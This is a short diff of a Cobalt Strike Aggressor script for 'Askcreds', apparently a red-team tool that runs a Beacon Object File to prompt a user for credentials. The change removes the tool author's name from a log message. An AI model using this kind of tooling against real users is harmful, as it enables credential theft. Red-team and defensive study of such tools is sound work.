@@ -14,7 +14,7 @@ alias Askcreds {
     $data   = readb($handle, -1);
     closef($handle);
 
-    blog($bid, "Askcreds BOF by Outflank, waiting max 60sec for user input...");
+    blog($bid, "Askcreds BOF, waiting max 60sec for user input...");
     if ($input eq "") {
         beacon_inline_execute($bid, $data, "go", $null);
     }
